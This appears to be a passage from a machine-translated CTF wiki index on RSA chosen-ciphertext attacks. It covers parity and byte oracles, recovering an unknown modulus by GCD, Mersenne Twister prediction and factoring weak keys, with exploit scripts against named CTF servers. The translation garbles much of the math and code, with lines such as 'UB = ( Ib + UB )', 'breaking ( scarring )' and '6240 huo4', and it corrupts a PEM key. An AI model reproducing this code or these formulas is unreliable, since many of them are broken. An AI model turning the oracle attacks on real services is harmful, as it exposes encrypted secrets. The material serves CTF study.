corresponding to this ciphertext.","title":"RSA parity oracle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#principle","text":"Hypothesis P $ C = e ^ N $ way The first time we can send to the server $ C * 2 ^ = e (2P) e ^ N $ way The server will calculate 2P $ N $ way Here 2P is an even number and its power is even. N is an odd number because it is multiplied by two large prime numbers. Then The server returns an odd number, ie 2P \\bmod N 2P \\bmod N is an odd number, indicating that 2P is greater than N, and an odd number of Ns is subtracted, and because 2P<2N 2P&lt;2N , an N is subtracted, ie \\frac{N }{2} \\leq P < N \\frac{N }{2} \\leq P &lt; N , we can also consider rounding down. If the server returns an even number, then 2P is less than N. That is, 0\\leq P < \\frac{N}{2} 0\\leq P &lt; \\frac{N}{2} , we can also round down. Here we use mathematical induction, which assumes that at the ith time, \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \\frac{xN}{2^{i}} \\leq P &lt; \\frac{xN+N}{2^{i}} Further, at the i+1th time, we can send C*2^{(i+1)e} C*2^{(i+1)e} The server will calculate $ 2 ^ {i + 1} P way N = 2 ^ {i + 1} P $ kN 0 \\leq 2^{i+1}P-kN<N 0 \\leq 2^{i+1}P-kN<N $ frac {kN} {2 ^ {i + 1}} leq P < frac {kN + N} According to the result of the ith \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} Then If the server returns an odd number, then k must be an odd number, k=2y+1, then \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^ {i+1}} \\frac{2yN+N}{2^{i+1}} \\leq P &lt; \\frac{2yN+2N}{2^ {i+1}} . At the same time, since P necessarily exists, the range obtained by the i+1 and the range obtained by the i-th must have an intersection. So y must be equal to x. If the server returns an even number, then k must be an even number, k=2y, where y must also be equal to x, then \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+ N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P &lt; \\frac{2xN+ N}{2^{i+1}} Further we can conclude lb = 0 ub = N if server returns 1 lb = ( lb + ub ) / 2 else : UB = ( Ib + UB ) / 2 Although it is divisible, that is, it is rounded down, but it does not matter that we have analyzed this problem at the beginning.","title":"Principle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-google-ctf-perfect-secrecy","text":"Here is an example of the 2018 Google CTF topic. #!/usr/bin/env python3 import sys import random from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def ReadPrivateKey ( filename ): return serialization . load_pem_private_key ( open ( filename , 'rb' ) . read (), password = None , backend = default_backend ()) def RsaDecrypt ( private_key , ciphertext ): assert ( len ( ciphertext ) <= ( private_key . public_key () . key_size // 8 )), 'Ciphertext too large' return pow ( int . from_bytes ( ciphertext , 'big' ), private_key . private_numbers () . d , private_key . public_key () . public_numbers () . n ) def Challenge ( private_key , reader , writer ): try : m0 = reader . read ( 1 ) m1 = reader . read ( 1 ) ciphertext = reader . read ( private_key . public_key () . key_size // 8 ) dice = RsaDecrypt ( private_key , ciphertext ) for rounds in range ( 100 ): p = [ m0 , m1 ][ dice & 1 ] k = random . randint ( 0 , 2 ) c = ( word ( p ) + k ) % 2 writer . write ( bytes (( c ,))) writer . flush () return 0 except Exception as e : return 1 def main (): private_key = ReadPrivateKey ( sys . argv [ 1 ]) return Challenge ( private_key , sys . stdin . buffer , sys . stdout . buffer ) if __name__ == '__main__' : sys . exit ( main ()) As can be seen We can give the server two numbers, and the server will decide which one to use based on the decrypted ciphertext content. The server will use random.randint(0, 2) to generate a random number and output the associated random 01 byte c. At first glance, it seems to be completely random. Check out random.randint(0, 2) to know that the generated random number is bounded, so the probability of generating an even number is greater than the probability of generating an odd number, then c and p The probability of the same parity is \u2154. Furthermore, by setting m0 and m1, we can know whether the last digit of the decrypted ciphertext is 0 or 1. This is actually the RSA parity oracle. Exp is as follows import gmpy2 from pwn import * encflag = open ( './flag.txt' ) . read () encflag = encflag . encode ( 'hex' ) encflag = int ( encflag , 16 ) #context.log_level = 'debug' m = [ ' \\x00 ' , ' \\x07 ' ] n = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1 e = 65537 flag = \"\" def guessvalue ( cnt ): if cnt [ 0 ] > cnt [ 1 ]: return 0 return 1 i = 0 while True : cnt = dict () cnt [ 0 ] = cnt [ 1 ] = 0 p = remote ( 'perfect-secrecy.ctfcompetition.com' , 1337 ) p . send ( m [ 0 ]) p . send ( m [ 1 ]) tmp = pow ( 2 , i ) two_inv = gmpy2 . invert ( tmp , n ) two_cipher = gmpy2 . powmod ( two_inv , e , n ) tmp = encflag * two_cipher % n tmp = hex ( tmp )[ 2 :] . strip ( 'L' ) tmp = '0' * ( 256 - len ( tmp )) + tmp tmp = tmp . decode ( 'hex' ) assert ( len ( tmp ) == 128 ) p . send ( tmp ) #print tmp data = \"\" while ( len ( data ) != 100 ): data += p . recv () for c in data : cnt [ U8 ( c )] + = 1 p . close () flag = str ( guessvalue ( cnt )) + flag print i , flag i += 1 Results are as follows 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 After decoding, you can get flag CTF { h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337 }","title":"2018 Google CTF Perfect Secrecy"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#title","text":"2016 Plaid CTF rabit 2016 sharif CTF lsb-oracle-150 2018 Backdoor CTF BIT-LEAKER 2018 XMAN trials baby RSA","title":"Title"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle","text":"Suppose there is currently an Oracle that decrypts a given ciphertext and gives the last byte of the plaintext. Then given an encrypted ciphertext, we only need \\log_{256}n \\log_{256}n times to know the plaintext message corresponding to this ciphertext.","title":"RSA Byte Oracle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#principle_1","text":"This is actually an extension of RSA parity Oracle. Since the last byte can be revealed, then the number of times we get the ciphertext corresponding plaintext should be reduced. Hypothesis P $ C = e ^ N $ way The first time we can send to the server C $ 256 * e ^ = (256P) e ^ N $ way The server will calculate 256P $ N $ way Here 256P is an even number. N is an odd number because it is multiplied by two large prime numbers. Since P is generally less than N, then 256P \\bmod N=256P-kn, k<256 256P \\bmod N=256P-kn, k&lt;256 . And for two different k_1, k_2 k_1, k_2 , we have 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 We can use the counter-evidence method to prove the above inequality. At the same time, the last byte of 256P-kn 256P-kn is actually -kn -kn obtained in the case of modulo 256. So, in fact, we can first enumerate the last byte in the case of 0~255, construct a mapping table of k and the last byte. When the server returns the last byte b, we can know k according to the mapping table constructed above, that is, subtract k N, that is, kN \\leq 256 P \\leq (k+1)N kN \\leq 256 P \\leq (k+1)N . After that, we use mathematical induction to obtain the range of P, that is, assume that at the ith time, \\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i }} \\frac{xN}{256^{i}} \\leq P &lt; \\frac{xN+N}{256^{i }} Further, at the i+1th time, we can send C*256^{(i+1)e} C*256^{(i+1)e} The server will calculate $ 256 ^ {i + 1} P way N = 256 ^ {i + 1} P $ kN 0 \\leq 256^{i+1}P-kN<N 0 \\leq 256^{i+1}P-kN<N $ frac {kN} {256} {i + 1}} leq P < frac {kN + N} According to the result of the ith \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} We can assume k=256y+t k=256y+t here, and the t here is what we can get through the mapping table. \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} At the same time, since P necessarily exists, the range obtained by the i+1 and the range obtained by the i-th must have an intersection. So y must be equal to x. Further we can summarize this, in the initial case lb = 0 ub = N Suppose the server returns b, then k = mab [ b ] interval = ( ub - lb ) / 256 lb = lb + interval * k ub = lb + interval","title":"Principle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-hitcon-lost-key","text":"This is a comprehensive topic. First, we don't give n. We can use the method of selecting a plaintext attack to get n. Of course, we can further obtain e. Finally, the code is as follows. from pwn import * import gmpy2 from fractions import Fraction p = process ( './rsa.py' ) #p = remote('18.179.251.168', 21700) #context.log_level = 'debug' p . recvuntil ( 'Here is the flag! \\n ' ) flagcipher = int ( p . recvuntil ( ' \\n ' , drop = True ), 16 ) def long_to_hex ( n ): s = hex ( n )[ 2 :] . rstrip ( 'L' ) if len ( s ) % 2 : s = '0' + s return s def send ( ch , num ): p . sendlineafter ( 'cmd: ' , ch ) p . sendlineafter ( 'input: ' , long_to_hex ( num )) data = p . recvuntil ( ' \\n ' ) return int ( data , 16 ) if __name__ == \"__main__\" : # get n cipher2 = send ( 'A' , 2 ) cipher4 = send ( 'A' , 4 ) nset = [] nset . append ( cipher2 * cipher2 - cipher4 ) cipher3 = send ( 'A' , 3 ) cipher9 = send ( 'A' , 9 ) nset . append ( cipher3 * cipher3 - cipher9 ) cipher5 = send ( 'A' , 5 ) cipher25 = send ( 'A' , 25 ) nset . append ( cipher5 * cipher5 - cipher25 ) n = nset [ 0 ] for item in nset : n = gmpy2 . gcd ( item , n ) # get map between k and return byte submap = {} for i in range ( 0 , 256 ): submap [ - n * i % 256 ] = i # get cipher256 cipher256 = send ( 'A' , 256 ) back = flagcipher L = Fraction ( 0 , 1 ) R = Fraction ( 1 , 1 ) for i in range ( 128 ): print i flagcipher = flagcipher * cipher256 % n b = send ( 'B' , flagcipher ) k = submap [ b ] L , R = L + ( R - L ) * Fraction ( k , 256 ), L + ( R - L ) * Fraction ( k + 1 , 256 ) low = int ( L * n ) print long_to_hex ( low - low % 256 + send ( 'B' , back )) . decode ( 'hex' )","title":"2018 HITCON lost key"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#reference","text":"https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack https://pastebin.com/KnEUSMxp","title":"Reference"},{"location":"crypto/asymmetric/rsa/rsa_complex/","text":"RSA Complex topic \u00b6 2018 Tokyo Western Mixed Cipher \u00b6 The information given by the title is as follows: The length of time each interaction can last is approximately 5 minutes n is a certain 1024 bit in each interaction, but unknown, e is 65537 Encrypted flag with aes, neither key nor IV Each time the key is fixed, but the IV will be random each time You can use rsa and aes for encryption with the encrypt function, where each encryption will randomly random es of aes You can use decrypt to decrypt random ciphertext, but only know what the last byte is. You can use the print_flag to get the flag ciphertext sa encrypted aes key can be obtained using print_key This topic looks like a topic, but in fact it is 3 topics, which need to be solved step by step. Before that, we are ready to interact with the function def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 4 & quot ;) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline () [: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 1 & quot ;) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline () [: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 2 & quot ;) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" ) GCD attack n \u00b6 In the first step, we need to calculate the n that is not given, because we can use the encrypt function to rsa encrypt the plaintext x we input, then we can use the nature of the divisibility to calculate n. Because x ^ e = c mod n So n | x ^ e - c We can construct enough x to calculate the most x ^ e - c to calculate the greatest common divisor and get n. def get_n(io): rsa_c,aes_c=encrypt_io(io,long_to_bytes(2)) n=pow(2,65537)-rsa_c for i in range(3,6): rsa_c, aes_c = encrypt_io(io, long_to_bytes(i)) n=primefac.gcd(n,pow(i,65537)-rsa_c) return n Can use encryption to check def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , & quot ; 123 & quot ;) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False RSA parity oracle \u00b6 Using the last byte of leave, we can choose to ciphertext attack, use RSA parity oracle to reply to the key of aes def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : Print LB , UB tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : UB = ( Ib + UB ) / 2 k + = 1 print ub , len ( long_to_bytes ( ub )) return ub PRNG Predict \u00b6 Here we can decrypt the contents of the 16 bytes of the flag, but the first 16 bytes without the IV can not be decrypted. At this point we can find that the random number used by IV generation uses getrandbits, and we can get enough random numbers, then we can make the PRNG prediction, and then get the random number directly. Here I use a ready-made java for Predict of PRNG. public class Main { static int [] state ; static int currentIndex ; 40 huo public static void main ( String [] args ) { state = new int [ 624 ] ; currentIndex = 0 ; // initialize(0); // for (int i = 0; i < 5; i++) { // System.out.println(state[i]); // } // for (int i = 0; i < 5; i++) { // System.out.println(nextNumber()); // } if ( args . length != 624 ) { System . err . println ( \"must be 624 args\" ); System . exit ( 1 ); } int [] arr = new int [ 624 ] ; for ( int i = 0 ; i < args . length ; i ++ ) { arr [ i ] = Integer . parseInt ( args [ i ] ); } breaking ( scarring ); for ( int i = 0 ; i < 6240 huo4 ; i ++ ) { System . out . println ( state [ i ] ); } // System.out.println(\"currentIndex \" + currentIndex); // System.out.println(\"state[currentIndex] \" + state[currentIndex]); // System.out.println(\"next \" + nextNumber()); // want -2065863258 } static void nextState () { // Iterate through the state for ( int i = 0 ; i < 624 ; i ++ ) { // y is the first bit of the current number, // and the last 31 bits of the next number int y = ( state [ i ] & 0x80000000 ) + ( state [ ( i + 1 ) % 624 ] & 0x7fffffff ); // first bitshift y by 1 to the right int next = y >>> 1 ; // xor it with the 397th next number next ^= state [ ( i + 397 ) % 624 ] ; // if y is odd, xor with magic number if (( y & 1L ) == 1L ) { next ^= 0x9908b0df ; } // now we have the result state [ i ] = next ; } } static int nextNumber () { currentIndex ++ ; int tmp = state [ currentIndex ] ; tmp ^= ( tmp >>> 11 ); tmp ^= ( tmp << 7 ) & 0x9d2c5680 ; tmp ^= ( tmp << 15 ) & 0xefc60000 ; tmp ^= ( tmp >>> 18 ); return tmp ; } static void initialize ( int seed ) { // http://code.activestate.com/recipes/578056-mersenne-twister/ // global MT // global bitmask_1 // MT[0] = seed // for i in xrange(1,624): // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] >> 30) + i)) & bitmask_1 // copied Python 2.7's impl (probably uint problems) state [ 0 ] = seed ; for ( int i = 1 ; i < 624 ; i ++ ) { state [ i ] = (( 1812433253 * state [ i - 1 ] ) ^ (( state [ i - 1 ] >> 30 ) + i )) & 0xffffffff ; } } static int unBitshiftRightXor ( int value , int shift ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 << ( 32 - shift )) >>> ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= part >>> shift ; // add the part to the result result |= part ; i ++ ; } return result ; } static int unBitshiftLeftXor ( int value , int shift , int mask ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 >>> ( 32 - shift )) << ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= ( part << shift ) & mask ; // add the part to the result result |= part ; i ++ ; } return result ; } static void rev ( int [] nums ) { for ( int i = 0 ; i < 624 ; i ++ ) { int value = nums [ i ] ; value = unBitshiftRightXor ( value , 18 ); value = unBitshiftLeftXor ( value , 15 , 0xefc60000 ); value = unBitshiftLeftXor ( value , 7 , 0x9d2c5680 ); value = unBitshiftRightXor ( value , 11 ); state [ i ] = value ; } } } Wrote a python and call java directly from Crypto.Util.number import long_to_bytes,bytes_to_long def encrypt_io (io, p): io.read_until(\"4: get encrypted keyn\") io.writeline ( &quot;1&quot;) io.read_until(\"input plain text: \") io.writeline(p) io.read_until(\"RSA: \") rsa_c = int (io.readline () [: - 1], 16) io.read_until(\"AES: \") aes_c=io.readline()[:-1].decode(\"hex\") return rsa_c,aes_c import subprocess import random def get_iv(io): rsa_c, aes_c = encrypt_io (io, &quot;1&quot;) return bytes_to_long(aes_c[0:16]) def splitInto32(w128): w1 = w128 & (2**32-1) w2 = (w128 >> 32) & (2**32-1) w3 = (w128 &gt;&gt; 64) &amp; (2 ** 32-1) w4 = (w128 >> 96) return w1,w2,w3,w4 def sign(iv): # converts a 32 bit uint to a 32 bit signed int if(iv&0x80000000): iv = -0x100000000 + iv return iv def get_state(io): numbers=[] for i in range(156): print i numbers.append(get_iv(io)) observedNums = [sign(w) for n in numbers for w in splitInto32(n)] o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums)) stateList = [int(s) % (2 ** 32) for s in o.split()] r = random.Random() state = (3, tuple(stateList + [624]), None) r.setstate(state) return r.getrandbits(128) EXP \u00b6 The overall attack code is as follows: from zio import * import import from Crypto.Util.number import long_to_bytes , bytes_to_long target = ( \"crypto.chal.ctf.westerns.tokyo\" , 5643 ) e = 65537 def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 4 & quot ;) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline () [: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 1 & quot ;) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline () [: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( & quot ; 2 & quot ;) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" ) def get_n ( io ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( 2 )) n = pow ( 2 , 65537 ) - rsa_c for i in range ( 3 , 6 ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( i )) n = primefac . gcd ( n , pow ( i , 65537 ) - rsa_c ) return n def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , & quot ; 123 & quot ;) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False import gmpy2 def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : Print LB , UB tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : UB = ( Ib + UB ) / 2 k + = 1 print ub , len ( long_to_bytes ( ub )) return ub io = zio ( target , timeout = 10000 , print_read = COLORED ( NONE , 'red' ), print_write = COLORED ( NONE , 'green' )) n = get_n ( io ) print check_n ( io , n ) c = get_enc_key ( io ) print len ( decrypt_io ( io , c )) == 16 m = guess_m ( io , n , c ) for i in range ( m - 50000 , m + 50000 ): if pow ( i , e , n ) == c : aeskey = i print long_to_bytes ( aeskey )[ - 1 ] == decrypt_io ( io , c )[ - 1 ] print \"found aes key\" , hex ( aeskey ) import fuck_r next_iv = fuck_r . get_state ( io ) print \"##########################################\" print next_iv print aeskey io . interact () 2016 ASIS Find the flag \u00b6 Here we take the example of Find the flag in the ASIS 2016 online game. The file is extracted and has a ciphertext, a public key, and a py script. Take a look at the public key. \u279c RSA openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 : d8: e2: 4c: 12 : b7: b9: 9e: fe: 0a: 9b: c0: 4a: f5: 8a: 2a: 94 : 42 : 69 : b4: 92 : b7: 37 : 6d: f1: 29 : 20 : 61 : b9 Exponent: 12405943493775545863 ( 0xac2ac3e0ca0f5607 ) Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9 Such a small N N , first break it down. p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 Look at the py script again. #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 flag = open ( 'flag' , 'r' ) . read () * 30 def ext_rsa_encrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) pubkey = RSA . construct (( long ( n ), long ( e ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) return enc except : p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) f = open ( 'pubkey.pem' , 'w' ) f . write ( pubkey . exportKey ()) g = open ( 'flag.enc' , 'w' ) g . write ( ext_rsa_encrypt ( p , q , e , flag )) The logic is very simple, read the flag and repeat 30 times for the ciphertext. Randomly take p p and q q , generate a public key, write pubkey.pem , encrypt it with the ext_rsa_encrypt function in the script, and finally write the ciphertext to flag.enc . Try decryption, suggest that the ciphertext is too long, and then look at the encryption function. When the encryption fails, the function will jump to the exception handling and re-take the larger p p and q q with a certain algorithm until the encryption succeeds. Then we just need to write a corresponding decryption function. #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 def ext_rsa_decrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( privatekey ) de_error = & #39;&#39; enc = key . decrypt ( msg . decode ( 'base64' ), de_error ) return enc except Exception as error : print error p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 n = p * q e = 12405943493775545863 # pubkey = RSA.construct((long(n), long(e))) # f = open('pubkey.pem', 'w') # f.write(pubkey.exportKey()) g = open ( 'flag.enc' , 'r' ) msg = g . read () flag = ext_rsa_decrypt ( p , q , e , msg ) print flag Get the flag ASIS {F4ct0R__N_by_it3rat! Ng!} SCTF RSA1 \u00b6 Here we take SCTF RSA1 as an example. After decompressing the compressed package, we get the following file. \u279c level0 git: ( master ) \u2717 ls -al Total dosage 4drwxrwxrwx 1 root root 0 7\u6708 30 16 :36 . drwxrwxrwx 1 root root 0 7\u6708 30 16 :34 .. -rwxrwxrwx 1 root root 349 5\u6708 2 2016 level1.passwd.enc -rwxrwxrwx 1 root root 2337 5\u6708 6 2016 level1.zip -rwxrwxrwx 1 root root 451 5\u6708 2 2016 public.key Try to unzip the level1.zip now requires a password. Then according to level1.passwd.enc, we should decrypt the file to get the corresponding password. View public key \u279c level0 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8: 89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c: 70 : 87 : 24 : D8: 98 : 3C: F3: 33 : 1c: BA: 5 : 61 : c2: EC: 2c: 5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6: bb: a3: 7d: 56 : 93 : 99 : 4d: 7e: 4c: 2f: aa: 60 : 7b: 3e: c8: fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21: ab: 61 : 57 : d7: e7: cc: 67 : 1b: 4d: cd: 66 : 4c: 7d: f1: 1a: 2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8: ( A5: 1 : 84 : 4a: a: 5c: 55 : 02 : e8: 8e: 56 : 4d: 38 : 70 : a5: 16 : 36 : d3: bc: 14 : 3e: 2f: ae: 2f: 31 : 58 : ba: 00 : ab: ac: c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7: 31 : 56 : 0b: ab: 0a: e6: 8d: ad: 08 : 22 : a9: 1f: cc: 01 : 4c: 12 : d2: ab: a3: a5: 97 : e5: 10 : 49 : 19 : 7f: d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b: 86 : 94 : 70 : a9: yes: 82 : fc: 54 : 6b: 06 : 23 : 43 : eb: b6: 1b: 91 : 35 : 5e: 53 : a6: e5: d8: 9a: 84 : b8: 9f: 63 : bc: 70 : 06 : 2d: 59 : d8: 62 : a5: fd: 5c: ab: 06 : 68 :81 Exponent: 65537 ( 0x10001 ) Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqkkiG9w0BAQEFAAOCAQ8AMIIBCgKCQQll + bg7c8nQQUu8e6qiJ 1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W k5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe RRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr V / XXUtcxVgurCuaNrQgiqR / LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG ZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo DOWNLOAD -----END PUBLIC KEY----- It is found that although it is 2048 bits, it is obvious that the modulus is not so long. Try to decompose and get p=250527704258269 q=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 Then you can construct and decrypt, the code is as follows from Crypto.PublicKey import RSA import gmpy2 from base64 import b64decode p = 250527704258269 q = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 e = 65537 n = p * q def getprivatekey ( n , e , p , q ): Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level1.passwd.enc' ) as f : cipher = f . read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) #getprivatekey(n, e, p, q) decrypt () Found wrong \u279c level0 git: ( master ) \u2717 python exp.py A bunch of garbled. . At this time, we must consider other situations. Generally speaking, the RSA implemented in reality will not directly use the original RSA, and will add some padding such as OAEP. Let's try and modify the code here. def decrypt1 () : with open ( './level1.passwd.enc' ) as f: cipher = f.read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f: key = RSA.importKey ( f ) key = PKCS1_OAEP.new ( key ) print key.decrypt ( cipher ) Sure enough, get \u279c level0 git: ( master ) \u2717 python exp.py FaC5ori1ati0n_aTTA3k_p_tOO_sma11 Get the decompression password. Go ahead and look at the public key in level1 